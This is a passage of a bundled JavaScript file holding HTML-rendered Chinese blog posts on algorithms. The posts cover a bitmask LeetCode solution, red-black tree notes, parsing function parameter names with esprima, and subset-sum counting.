&quot;xtfn&quot;.</code></pre></code></pre><p>解析：\\n这题肯定要进行交叉对比(2个for循环)，但最关键的就是对比过程，也就是判断2个字符串是否存在相同的字符。</p>\\n<p>如果使用<code>indexOf</code>或者数组下标记录都会造成时间复杂度大幅提升，看了他人的答案发现使用的是位操作符<code>&lt;&lt;</code>，<code>|</code>和<code>&amp;</code>，而且是在交叉对比之前进行预处理，交叉对比的时候只需要简单的判断<code>pretreate[i] &amp; pretreate[j]===0</code>便可，</p>\\n<p>因为使用后效率提升太多，解析并且记录一下。</p>\\n<p>先解释<code>val |= (1 &lt;&lt; (word.charCodeAt(i)-aCode))</code>：</p>\\n<ul>\\n<li><p><code>word.charCodeAt(i)-aCode</code>这个很好懂，也就是a对应0，b对应1...这里的0,1数字代表的是<br>二进制1后面的位数。</p>\\n</li>\\n<li><p><code>1&lt;&lt;0</code>，<code>1&lt;&lt;1</code>是什么呢？</p>\\n<p>  1在二进制中(32位)就是<code>00000000000000000000000000000001</code>，<code>&lt;&lt;</code>是左移1位，</p>\\n<p>  那么<code>1&lt;&lt;0</code>还是<code>1</code>，<code>1&lt;&lt;1</code>就是(前面的零省略)<code>10</code>，<code>1&lt;&lt;2</code>就是<code>100</code>，<code>1&lt;&lt;3</code>就是<code>1000</code>，</p>\\n<p>  于是可知</p>\\n<p>  <code>a</code>就是<code>1</code>，</p>\\n<p>  <code>b</code>是<code>10</code>，</p>\\n<p>  <code>c</code>是<code>100</code>...</p>\\n<p>  <code>z</code>是<code>10000000000000000000000000</code>(25个0)。</p>\\n</li>\\n<li><p><code>|</code>是按位或：二进制编码中，每一位两者其中一个为1，则为1，否则，则为0，</p>\\n<p>   因此 <code>val |=</code>就是对每一个字符合并，例如</p>\\n<p>   <code>ab</code> 是 <code>00010|00001</code>=&gt;<code>00011</code>，</p>\\n<p>   <code>f</code> 是 <code>100000</code>，</p>\\n<p>   <code>ffff</code> 也是 <code>100000</code>，</p>\\n<p>   <code>big</code>是 <code>101000010</code>，</p>\\n<p>   <code>axdg</code>是<code>100000000000000001001001</code>。</p>\\n</li>\\n<li><p><code>&amp;</code>，按位与，二进制编码中，每一位两者都为1，则为1，否则，则为0，</p>\\n<p>  例1：<code>axdg</code>和<code>oigd</code>要判断是否有重复：</p>\\n<pre><code><pre class=\\"hljs\\"><code>  axdg是：100000000000000001001001\\n\\n  oifd是：         100000100101000\\n\\n  &amp; 后：  000000000000000000001000  </code></pre></code></pre><p>  因为第4位都为1，所以最后不为0，也可得知重复的就是字母表第4位：<code>d</code>。</p>\\n<p>  &nbsp;</p>\\n<p>  例2：<code>axdg</code>和<code>lkmk</code>要判断是否有重复：</p>\\n<p>  结果为0，说明无重复。</p>\\n<pre><code><pre class=\\"hljs\\"><code>  axdg是：100000000000000001001001\\n\\n  lkmk是：           1110000000000\\n\\n  &amp; 后：  000000000000000000000000  </code></pre></code></pre><p>总结：这种方法使用了二进制数字的位数作为保存字符的手段，相比起数组，散列表等，速度更快，在保存量较小(&lt;=32)优势非常明显。</p>\\n</li>\\n</ul>\\n<p>代码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{string[]}</span> <span class=\\"hljs-variable\\">words</span></span>\\n * <span class=\\"hljs-doctag\\">@return <span class=\\"hljs-type\\">{number}</span></span>\\n */</span>\\n<span class=\\"hljs-keyword\\">var</span> maxProduct = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">words</span>) </span>{\\n    <span class=\\"hljs-keyword\\">let</span> aCode=<span class=\\"hljs-string\\">\'a\'</span>.charCodeAt(<span class=\\"hljs-number\\">0</span>)\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compute</span>(<span class=\\"hljs-params\\">word</span>)</span>{\\n        <span class=\\"hljs-keyword\\">let</span> val=<span class=\\"hljs-number\\">0</span>\\n        <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;word.length;i++){\\n            val |= (<span class=\\"hljs-number\\">1</span> &lt;&lt; (word.charCodeAt(i)-aCode))\\n        }\\n        <span class=\\"hljs-keyword\\">return</span> val\\n    }\\n    <span class=\\"hljs-keyword\\">let</span> pretreatment=[]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;words.length;i++){\\n        pretreatment[i]=compute(words[i])\\n    }\\n    <span class=\\"hljs-keyword\\">let</span> maxSum=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;words.length<span class=\\"hljs-number\\">-1</span>;i++){\\n        <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=i+<span class=\\"hljs-number\\">1</span>;j&lt;words.length;j++){\\n            <span class=\\"hljs-keyword\\">let</span> len1=words[i].length,len2=words[j].length\\n            <span class=\\"hljs-keyword\\">if</span>(len1*len2&gt;maxSum &amp;&amp; (pretreatment[i] &amp; pretreatment[j])===<span class=\\"hljs-number\\">0</span>){\\n                 maxSum=len1*len2\\n            }\\n        }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> maxSum\\n};</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-06","timeArr":[2018,8,6,0,0,0,0],"title":"关于位操作符应用的算法题","uuid":"c8b2b19bf52484de902c2d4d23a44ed8b158ab18","summary":"<p><a href=\\"https://leetcode.com/problems/maximum-product-of-word-lengths/\\">原题目</a>：\\n给定一个字符串数组，找到长度的最大值<code>length(word[i]) * length(word[j])</code>，其中两个单词中的字母无相同。您可以假定每个单词只包含小写字母。如果没有...</p>","slug":"guan-yu-wei-cao-zuo-fu-ying-yong-de-suan-fa-ti","sha":"7963f582de66e6e2582fb61249dbba57221190fe"}')},599:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"gui-ze\\">规则</h3>\\n<ol>\\n<li>原型是<code>2-3树</code></li>\\n<li>红链接：相当于<code>2-3树</code>的<code>3节点</code>，红链接中子节点是<code>红色</code>，父节点是<code>黑色</code></li>\\n<li>只存在红链接为左链接，发现红链接为右链接需要转换</li>\\n<li>当节点为null，也认为是<code>黑色</code></li>\\n<li>当插入节点，出现2个左红点相邻(不可能出现2个右红点相邻，因为第3条)，其实就是<code>2-3树</code>中出现了<code>4节点</code>，需要转换。</li>\\n<li>当删除节点，需要让被删除的节点为<code>红色</code>(通过转换)</li>\\n<li>红黑树的插入和删除都是建议在<code>递归</code>执行的基础上</li>\\n</ol>\\n<hr>\\n<h3 id=\\"cha-ru\\">插入</h3>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E6%8F%92%E5%85%A5%E8%8A%82%E7%82%B9.png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">insert</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-comment\\">// ...正常二叉树的处理</span>\\n\\n  <span class=\\"hljs-comment\\">// 以下三条会在递归过程中处理</span>\\n  <span class=\\"hljs-keyword\\">if</span>(isRed(node.left) &amp;&amp; isRed(node.right)) flipColors(node)\\n  <span class=\\"hljs-keyword\\">if</span>(!isRed(node.left) &amp;&amp; isRed(node.right))node=rotateLeft(node)\\n  <span class=\\"hljs-keyword\\">if</span>(isRed(node.left) &amp;&amp; isRed(node.left.left))node=rotateRight(node)\\n}</code></pre></code></pre>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E6%8F%92%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png\\" alt=\\"\\"></p>\\n<p>例(B代表<code>black</code>, R代表<code>red</code>)：</p>\\n<pre><code><pre class=\\"hljs\\"><code>                              R3为右红左黑       R5为左红左左红        此时已经到达根节点，虽然左红右红，\\n    B5       添加4     B5      执行第二条     B5   执行第三条     B4    但不会执行第一条，留到下一次执行 \\n   /  \\\\      ---&gt;     /  \\\\      ---&gt;        /  \\\\     ---&gt;      /  \\\\   \\n  R3  Null          R3  Null              R4  Null            R3   R5   \\n                     \\\\                   /                                          \\n                      R4               R3                                           </code></pre></code></pre><hr>\\n<h3 id=\\"shan-chu\\">删除</h3>\\n<h4 id=\\"zuo-jie-dian\\">左节点</h4>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E5%88%A0%E9%99%A4(%E5%B7%A6%E8%8A%82%E7%82%B9).png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (val &lt; node.val)  {\\n  <span class=\\"hljs-comment\\">// 检测左节点如果是2节点(黑色)，那么需要将它变为3节点(红色)再删除</span>\\n  node=checkLeftNodeAndMove(node)\\n  <span class=\\"hljs-comment\\">// 继续往下执行</span>\\n  node.left = _remove(node.left, val);\\n}<span class=\\"hljs-keyword\\">else</span>{ <span class=\\"hljs-comment\\">/* ... */</span>}</code></pre></code></pre>\\n<p> 在<code>checkLeftNodeAndMove</code>内部，如果检测到左边是个<code>2节点</code>(左黑 &amp; 左左黑)，那么先<code>flipColors</code>，这么做是为了让当前<code>node</code>先\\n成为一个<code>3节点</code>或者<code>4节点</code>(左红,右红?)，让左节点(<code>2节点</code>)可以通过右节点或者通过<code>node</code>去借一个红色节点(转换)，然后就去\\n检测右边，右边存在<code>3节点</code>(右左红)，那么就从右边借(<code>rotateRight + rotateLeft</code>)，如果右边不存在，通过递归和执行\\n<code>flipColors</code>，最终可以从<code>node</code>去借一个红色节点。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">checkLeftNodeAndMove</span>(<span class=\\"hljs-params\\">node</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 确保左边只是个2节点</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!isRed(node.left) &amp;&amp; !isRed(node.left.left))\\n    node= moveRedLeft(node);\\n  <span class=\\"hljs-keyword\\">return</span> node\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">moveRedLeft</span>(<span class=\\"hljs-params\\">node</span>) </span>{\\n  <span class=\\"hljs-comment\\">// 将node变为3节点或者4节点</span>\\n  flipColors(node);\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.right.left)) {\\n    <span class=\\"hljs-comment\\">// 判断是否可以从右节点接一个红色节点</span>\\n    node.right = rotateRight(node.right);\\n    node = rotateLeft(node);\\n    <span class=\\"hljs-comment\\">// 已经从右节点借到一个红色节点，解除node的多节点</span>\\n    flipColors(node);\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> node;\\n}</code></pre></code></pre>\\n<hr>\\n<h4 id=\\"you-jie-dian\\">右节点</h4>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E5%88%A0%E9%99%A4(%E5%8F%B3%E8%8A%82%E7%82%B9).png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (val &lt; node.val)  {\\n  <span class=\\"hljs-comment\\">/* ...左节点的处理... */</span>\\n}<span class=\\"hljs-keyword\\">else</span> {\\n  <span class=\\"hljs-comment\\">// 如果是3节点，需要先右旋，保证被删除的不是父级树</span>\\n  <span class=\\"hljs-comment\\">/*\\n  例如： 5         3\\n        /   ==&gt;     \\\\\\n     R 3           R 5\\n  */</span>\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left))\\n    node = rotateRight(node);\\n  <span class=\\"hljs-comment\\">// 找到值，通过上面右转，无右子树，直接删除</span>\\n  <span class=\\"hljs-keyword\\">if</span> (val===node.val  &amp;&amp; (node.right == <span class=\\"hljs-literal\\">null</span>))\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">null</span>;\\n\\n  <span class=\\"hljs-comment\\">// 检测右侧可能被删除的节点如果是2节点(黑色)，那么需要将它变为3节点(红色)再删除</span>\\n  node=checkRightNodeAndMove(node)\\n  <span class=\\"hljs-keyword\\">if</span> (val === node.val) {\\n    <span class=\\"hljs-keyword\\">let</span> x = min(node.right);\\n    node.val = x.val;\\n    node.right = _remove(node.right,x.val);\\n  }\\n  <span class=\\"hljs-keyword\\">else</span> node.right =_remove(node.right, val);\\n}</code></pre></code></pre>\\n<p> 在<code>checkLeftNodeAndMove</code>内部，如果检测到右边<strong>有可能是删除位置</strong>的节点是个<code>2节点</code>(右黑 &amp; 右左黑)，那么先<code>flipColors</code>，\\n 同样也是为了让当前<code>node</code>先成为一个<code>3节点</code>或者<code>4节点</code>，然后就去检测左边，左边存在<code>3节点</code>(左左红)，那么就从左边借\\n (<code>rotateRight</code>)，如果左边不存在，通过递归和执行<code>flipColors</code>，最终可以从<code>node</code>去借一个红色节点。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">checkRightNodeAndMove</span>(<span class=\\"hljs-params\\">node</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 如果右节点 或者 右节点的左孩子 为红色，这两个节点是有可能会被删除的节点，则不需要调整，可以继续递归至下一层</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!isRed(node.right) &amp;&amp; !isRed(node.right.left))\\n  <span class=\\"hljs-comment\\">// 调整为3节点</span>\\n    node = moveRedRight(node);\\n  <span class=\\"hljs-keyword\\">return</span> node\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">moveRedRight</span>(<span class=\\"hljs-params\\">node</span>) </span>{\\n  <span class=\\"hljs-comment\\">// 将node变为3节点或者4节点</span>\\n  flipColors(node);\\n  <span class=\\"hljs-comment\\">// 判断是否可以从左节点接一个红色节点</span>\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left.left)) {\\n    node = rotateRight(node);\\n    <span class=\\"hljs-comment\\">// 已经从左节点借到一个红色节点，解除node的多节点</span>\\n    flipColors(node);\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> node;\\n}</code></pre></code></pre>\\n<hr>\\n<h4 id=\\"balance\\">balance</h4>\\n<p>删除操作结束后，<strong>递归</strong>执行<code>balance</code></p>\\n<p>检测一下内容</p>\\n<ul>\\n<li>检测是否存在右红链接</li>\\n<li>检测是否存在2个左红链接相邻</li>\\n<li>检测是否存在<code>4节点</code>(左红右红)</li>\\n</ul>\\n<p>其实就是<code>插入节点</code>的3个<code>if</code>，这两个表达意思是一模一样，可以通用(已测试)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">balance</span>(<span class=\\"hljs-params\\">node</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.right))  node = rotateLeft(node);\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left) &amp;&amp; isRed(node.left.left)) node = rotateRight(node);\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left) &amp;&amp; isRed(node.right)) flipColors(node);\\n  <span class=\\"hljs-keyword\\">return</span> node;\\n}</code></pre></code></pre>\\n","toc":[{"anchor":"gui-ze","level":3,"text":"规则"},{"anchor":"cha-ru","level":3,"text":"插入"},{"anchor":"shan-chu","level":3,"text":"删除"},{"anchor":"zuo-jie-dian","level":4,"text":"左节点"},{"anchor":"you-jie-dian","level":4,"text":"右节点"},{"anchor":"balance","level":4,"text":"balance"}],"relatedTags":null,"created_at":"2018-12-10","timeArr":[2018,11,10,0,0,0,0],"title":"红黑树要点-根据《算法第4版》","uuid":"2bd50bd84bc74d731859ba7d0c3008c8ed84172a","summary":"<h4>规则：</h4>\\n<ol>\\n<li>原型是<code>2-3树</code></li>\\n<li>红链接：相当于<code>2-3树</code>的<code>3节点</code>，红链接中子节点是<code>红色</code>，父节点是<code>黑色</code></li>\\n<li>只存在红链接为左链接，发现红链接为右链接需要转换</li>\\n<li>当节点为null，也认为是<code>黑色</code></li>\\n<li>当插入节点，出现2个左红点相邻(不可能出现2个右红点相邻，因为第3条)，其实就是`...</li>\\n</ol>","slug":"hong-hei-shu-yao-dian-gen-ju-suan-fa-di-4-ban-","sha":"18598c17b6c44620cb536b5b1bb6fa7f9f9cd4e4"}')},600:function(n){n.exports=JSON.parse('{"content":"<p>今天碰到一个需求，获取函数参数名称，\\n刚开始打算用正则去处理，但函数写法(包括es6)也挺多的，</p>\\n<p>例如：</p>\\n<pre><code><pre class=\\"hljs\\"><code>function x(a,b){}\\nfunction x(a=5,b=3){}\\nlet x=function(a=5,b){}\\nlet x=(a=5,b)=&gt;a+b\\nlet x=a=&gt;a*2\\nfunction x(a,/* b */){}</code></pre></code></pre><p>如果用正则去兼容所有情况，考虑的会比较复杂，而且不能有冲突。</p>\\n<p>这里使用<code>AST</code>语法树去获取，思路就是</p>\\n<ol>\\n<li><p>函数可以分为3类，分别是</p>\\n<p><code>FunctionDeclaration</code>，对应 <code>function x(a,b){}</code>\\n<code>FunctionExpression</code>，对应<code>let x=function(a=5,b){}</code>\\n<code>ArrowFunctionExpression</code>，对应<code>let x=a=&gt;a*2</code></p>\\n</li>\\n<li><p>获取语法分析包<code>npm install --save esprima</code>，\\n 获取语法树递归解析包<code>npm install --save estraverse</code></p>\\n<p> 使用<code>estraverse</code>去处理语法树，可以省去很多判断处理，因为它已经帮你处理好了</p>\\n</li>\\n<li><p>编写代码处理</p>\\n</li>\\n</ol>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> esprima=<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'esprima\'</span>);\\n<span class=\\"hljs-keyword\\">const</span> estraverse =<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'estraverse\'</span>);\\n<span class=\\"hljs-keyword\\">const</span> astEsprima=esprima.parse(testFunc)\\n<span class=\\"hljs-keyword\\">let</span> res\\n  estraverse.traverse(astEsprima, {\\n    <span class=\\"hljs-comment\\">// estraverse递归进入的时候触发</span>\\n    <span class=\\"hljs-attr\\">enter</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">node</span>) </span>{\\n      <span class=\\"hljs-comment\\">// 函数对应3种类型</span>\\n      <span class=\\"hljs-keyword\\">if</span>(node.type===<span class=\\"hljs-string\\">\\"FunctionDeclaration\\"</span> || \\n      node.type===<span class=\\"hljs-string\\">\\"ArrowFunctionExpression\\"</span> || \\n      node.type===<span class=\\"hljs-string\\">\\"FunctionExpression\\"</span>){\\n        <span class=\\"hljs-keyword\\">let</span> params=node.params\\n        params=params.map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">o</span>=&gt;</span>{\\n          <span class=\\"hljs-comment\\">// 当参数是表达式时，需要递归解析，找到`Identifier`</span>\\n          <span class=\\"hljs-keyword\\">while</span>(o.type!==<span class=\\"hljs-string\\">\'Identifier\'</span>)o=o.left\\n          <span class=\\"hljs-keyword\\">return</span> o.name\\n        })\\n        res=params\\n        <span class=\\"hljs-comment\\">// 中断estraverse递归</span>\\n        <span class=\\"hljs-keyword\\">this</span>.break()\\n      }\\n    }\\n  });</code></pre></code></pre>\\n<hr>\\n<p>测试：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> test=[\\n  <span class=\\"hljs-string\\">\'function d(a,b,c){}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\",\\"c\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function d(){}\'</span> <span class=\\"hljs-comment\\">// returns []</span>\\n  ,<span class=\\"hljs-string\\">\'function named(a, b, c) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\",\\"c\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a /* = 1 */, b /* = true */) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function fprintf(handle, fmt /*, {}*/) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"handle\\",\\"fmt\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x( a, b = 1, c ){}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\",\\"c\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a=4*(5/3), b) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a /* function() yes */, \\\\n /* no, */b)/* omg! */{}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x( A, b \\\\n,c ,d \\\\n ) \\\\n {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"A\\",\\"b\\",\\"c\\",\\"d\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a,b){}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function $args(func) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"func\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function Object() {}\'</span> <span class=\\"hljs-comment\\">// returns []</span>\\n  ,<span class=\\"hljs-string\\">\'e=&gt;{}\'</span>  <span class=\\"hljs-comment\\">// [\\"e\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'(a,b)=&gt;{}\'</span>  <span class=\\"hljs-comment\\">// [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'(e)=&gt;1\'</span> <span class=\\"hljs-comment\\">// [\\"e\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'(a=65,b=undefined)=&gt;\\"string\\"\'</span> <span class=\\"hljs-comment\\">// [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'ddd=e=&gt;{}\'</span>  <span class=\\"hljs-comment\\">// [\\"e\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'let xx=(e,b)=&gt;{}\'</span> <span class=\\"hljs-comment\\">// [\\"e\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'xx=function(bb){}\'</span>  <span class=\\"hljs-comment\\">// [\\"bb\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'let x=function(aa,cc){}\'</span>  <span class=\\"hljs-comment\\">// [\\"aa\\",\\"cc\\"]</span>\\n  ,<span class=\\"hljs-string\\">`let x=(controller) =&gt;{  \\n    }`</span>                      <span class=\\"hljs-comment\\">// [\\"controller\\"] </span>\\n]</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-13","timeArr":[2018,8,13,0,0,0,0],"title":"获取函数参数名称","uuid":"be95143b4d5b92aa8901844dde5e73230a1d2f49","summary":"<p>今天碰到一个需求，获取函数参数名称，\\n刚开始打算用正则去处理，但函数写法(包括es6)也挺多的，</p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code>function x(a,b){}\\nfunction x(a=5,b=3){}\\nlet x=function(a=5,b){}\\nlet x=(a=5,b)=&gt;a+b\\nlet x=a=&gt;a*2\\nfuncti...</code></pre>","slug":"huo-qu-han-shu-can-shu-ming-cheng","sha":"666081661a6e70d949e3a7754293a33f83e18432"}')},601:function(n){n.exports=JSON.parse('{"content":"<p>记录一个算法，要求获取数组中的和为<code>sum</code>的组合的数量</p>\\n<ul>\\n<li>不要求连续，不要求重复</li>\\n</ul>\\n<p>例如<code>arr=[1,2,3,4,5]</code>，那么和为5的组合数量为3，分别是<code>2,3</code>、<code>1,4</code>、<code>5</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">computeSubset</span>(<span class=\\"hljs-params\\">arr,sum</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 创建数组，用于记录从1到sum每一个数的组合数量</span>\\n  <span class=\\"hljs-keyword\\">let</span> aux=<span class=\\"hljs-built_in\\">Array</span>(sum+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-number\\">0</span>)\\n  <span class=\\"hljs-comment\\">// 设置0为1，因为后面的处理，0也就是它本身</span>\\n  aux[<span class=\\"hljs-number\\">0</span>]=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> arr){\\n    <span class=\\"hljs-comment\\">// 这里i&lt;n，就没意义了，就会出现数组索引是负值</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=sum;i&gt;=n;i--){\\n      <span class=\\"hljs-comment\\">// 精髓，见最后</span>\\n      aux[i]+=aux[i-n]\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// 返回第sum个的组合数量</span>\\n  <span class=\\"hljs-keyword\\">return</span> aux[sum]\\n}\\n\\ncomputeSubset([<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-number\\">5</span>],<span class=\\"hljs-number\\">5</span>) <span class=\\"hljs-comment\\">// 3</span></code></pre></code></pre>\\n<p>关于上面<code>aux[i]+=aux[i-1]</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>aux[1] = aux[1] +aux[0]\\naux[2] = aux[2] +aux[1]\\naux[3] = aux[3] +aux[2]</code></pre></code></pre><p>==&gt;<code>aux[3] = aux[3] +aux[2] +aux[1] +aux[0]</code></p>\\n<hr>\\n<ul>\\n<li>不要求连续，要求重复</li>\\n</ul>\\n<p>例如：<code>arr=[1,2,5]</code>，那么和为5的组合为4，分别是<code>1,1,1,1,1</code>、<code>1,1,1,2</code>、<code>2,2,1</code>、<code>5</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> change = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">arr,sum</span>) </span>{\\n  <span class=\\"hljs-keyword\\">let</span> aux=<span class=\\"hljs-built_in\\">Array</span>(sum+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-number\\">0</span>)\\n  aux[<span class=\\"hljs-number\\">0</span>]=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> arr){\\n    <span class=\\"hljs-comment\\">// 上一题这里是逆序，这里是顺序</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=n;i&lt;aux.length;i++){\\n      aux[i]+=aux[i-n]\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> aux[sum]\\n};</code></pre></code></pre>\\n<hr>\\n<ul>\\n<li>要求连续，不要求重复</li>\\n</ul>\\n<p>例如<code>arr=[1,2,3,4,5]</code>，那么和为5的组合数量为2，分别是<code>2,3</code>、<code>5</code></p>\\n<p>写法一：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcSumCount</span>(<span class=\\"hljs-params\\">arr,target</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prefix=[<span class=\\"hljs-number\\">1</span>],curSum=<span class=\\"hljs-number\\">0</span>,result=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    curSum+=arr[i]\\n    <span class=\\"hljs-keyword\\">if</span>(curSum&gt;=target)result+=prefix[curSum-target] || <span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">if</span>(!prefix[curSum])prefix[curSum]=<span class=\\"hljs-number\\">1</span>\\n    <span class=\\"hljs-keyword\\">else</span> prefix[curSum]++\\n  }\\n<span class=\\"hljs-keyword\\">return</span> result\\n}</code></pre></code></pre>\\n<p>写法二：<code>windowSlide</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">windowSlideSum</span>(<span class=\\"hljs-params\\">arr,target</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> sum=<span class=\\"hljs-number\\">0</span>,result=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">let</span> head=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    sum+=arr[i]\\n    <span class=\\"hljs-keyword\\">while</span>(sum&gt;=target &amp;&amp; head&lt;=i){\\n      <span 